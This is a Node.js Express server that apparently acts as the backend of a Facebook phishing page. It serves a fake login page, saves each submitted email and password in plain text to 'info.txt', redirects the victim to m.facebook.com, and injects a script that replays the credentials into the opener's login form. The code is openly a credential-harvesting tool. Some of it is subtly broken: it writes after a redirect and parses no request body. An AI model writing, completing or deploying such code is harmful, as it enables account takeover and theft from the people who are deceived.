const express = require("express");
const app = express();
const fs = require("fs");

const PORT = process.env.PORT || 3030;

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/login.html');
});

app.post('/login', (req, res) => {
  const email = req.body.email;
  const password = req.body.password;

  fs.appendFile('info.txt', `Email: ${email}\nPassword: ${password}\n\n`, (err) => {
    if (err) {
      console.error(err);
    }
  });

  res.redirect('https://m.facebook.com');
  res.write(`<script>window.opener.document.getElementsByName('email')[0].value = '${email}'; window.opener.document.getElementsByName('pass')[0].value = '${password}'; window.opener.document.forms[0].submit();</script>`);
  res.end();
});

app.listen(PORT, () => {
  console.log(`server started on port ${PORT}`);
});